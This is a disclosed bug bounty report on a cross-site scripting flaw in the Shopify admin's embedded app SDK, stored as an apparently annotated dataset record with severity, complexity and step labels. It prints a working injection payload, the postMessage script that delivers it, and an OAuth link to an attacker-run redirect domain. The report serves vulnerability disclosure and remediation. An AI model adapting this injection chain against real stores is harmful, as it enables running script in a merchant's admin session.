{
    "reported_to": "Shopify",
    "reported_by": "bored-engineer ",
    "title": "XSS in $shop$.myshopify.com/admin/ via twine template injection in \"Shopify.API.Modal.input\" method when using a malicious app",
    "content": "\nDescription\nThe Shopify Embedded App SDK is used to facilitate limited interactions with parent page (/admin/apps/$id) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using lodash's _.template method. While the method automatically provides input escaping the \"input\" template (used by the Shopify.API.Modal.input method) assigns a value to a special data-define attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by twine. Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application.\nTechnical Details\nWhen the Shopify.API.Modal.input method the following \"input\" template is rendered using lodash's _.template method:\nCode 476 Bytes\n1...\n2<div class=\"ui-modal__body\" data-define=\"{typedInput: &#39;[%= value %]&#39;}\">\n3...\n4<label class=\"next-label\" for=\"text-a10e7047a92878fc20031f40da0b5231\"></label>\n5<input type=\"text\" id=\"text-a10e7047a92878fc20031f40da0b5231\" data-bind=\"typedInput\" autofocus=\"autofocus\" class=\"next-input\" />\n6...\n7<button class=\"btn close-modal [%= buttonClass %]\" data-bind-event-click=\"closeModal({result: true, data: typedInput})\" type=\"button\" name=\"button\">[%= okButton %]</button>\n8...\nThe typedInput parameter is initialized from the value template parameter, bound to the text input, and finally used when the \"okButton\" is clicked. The data binding is handled by Shopify's twine JS library. Unfortunately because _.template is not fully context aware it will not provide JSON escaping for this parameter. For example if value is set to some'value the following invalid JSON will be created in the data-define attribute:\nCode 26 Bytes\n1{typedInput: 'some'value'}\nNormally this would just break the intended functionality, however if we analyze twine we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:\nCode 866 Bytes\n1wrapFunctionString = function(code, args, node) {\n2  var e, error, keypath;\n3  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {\n4    if (keypath[0] === '$root') {\n5      return function($context, $root) {\n6        return getValue($root, keypath);\n7      };\n8    } else {\n9      return function($context, $root) {\n10        return getValue($context, keypath);\n11      };\n12    }\n13  } else {\n14    code = \"return \" + code;\n15    if (nodeArrayIndexes(node)) {\n16      code = \"with($arrayPointers) { \" + code + \" }\";\n17    }\n18    if (requiresRegistry(args)) {\n19      code = \"with($registry) { \" + code + \" }\";\n20    }\n21    try {\n22      return new Function(args, \"with($context) { \" + code + \" }\");\n23    } catch (error) {\n24      e = error;\n25      throw \"Twine error: Unable to create function on \" + node.nodeName + \" node with attributes \" + (stringifyNodeAttributes(node));\n26    }\n27  }\n28};\nThe method wraps the attribute value in a with block to provide named variables and passes it to a Function constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the value template parameter it will flow as follows:\nCode 26 Bytes\n1'-alert(document.domain)-'\nThis will result in a data-define attribute with the following value:\nCode 34 Bytes\n1{typedInput:''-document.domain-''}\nThis will result in the following code executing within twine:\nCode 96 Bytes\n1with($context) {\n2  with($registry) {\n3    return {typedInput: ''-alert(document.domain)-''}\n4  }\n5}\nPutting this all together with the SDK we get the following script:\nCode 188 Bytes\n1window.parent.postMessage(JSON.stringify({\n2  message: \"Shopify.API.Modal.input\",\n3  data: {\n4    message: {\n5      message: \"\", \n6      value: \"'-alert(document.domain)-'\",\n7    }\n8  }\n9}), \"*\");\nExploitability\nYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application.\nProof of Concept\nI've created an example malicious application associated with my partner account shopify-whitehat-1@bored.engineer to demonstrate the issue...\nOpen the following URL on on $your-shop$.myshopify.com:\nCode 176 Bytes\n1/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce\nAfter authorizing the application an alert should appear on the /admin window containing document.domain.\nRemediation\nThe \"input\" template should be updated to make the value parameter context-aware, perhaps wrapping in a JSON.stringify call.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": 1000,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1496349720,
    "report_url": "https://hackerone.com/reports/217790",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create a malicious Shopify application and associate it with a partner account."
        ],
        [
            2,
            "Convince an administrator to authorize the malicious application by directing them to the OAuth authorization URL."
        ],
        [
            3,
            "Once authorized, the application triggers the XSS vulnerability via the Shopify.API.Modal.input method with a crafted payload."
        ],
        [
            4,
            "The payload executes arbitrary JavaScript in the context of the Shopify admin domain, demonstrating the XSS vulnerability."
        ]
    ],
    "vuln_description": "This vulnerability is a Cross-Site Scripting (XSS) issue in the Shopify admin interface, triggered through a malicious app. The flaw arises from improper escaping in the Shopify.API.Modal.input method's template rendering, allowing JavaScript execution in the admin context via Twine's data binding.",
    "reason": "The vulnerability involves understanding multiple components: the Shopify Embedded App SDK, Lodash template rendering, Twine data binding, and the interaction between these systems. The attacker must recognize the non-obvious chain from template injection to JavaScript execution through Twine's context wrapping. Additionally, the exploit requires manipulating the application state through a malicious app installation.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "authnz_metadata": {
        "reason": "The vulnerability involves a malicious app exploiting a template injection in the Shopify admin interface, which is a client-side issue. The proposed methodology focuses on server-side authorization checks by swapping user sessions and resource IDs, not client-side template injection vulnerabilities.",
        "is_detectable": false
    }
}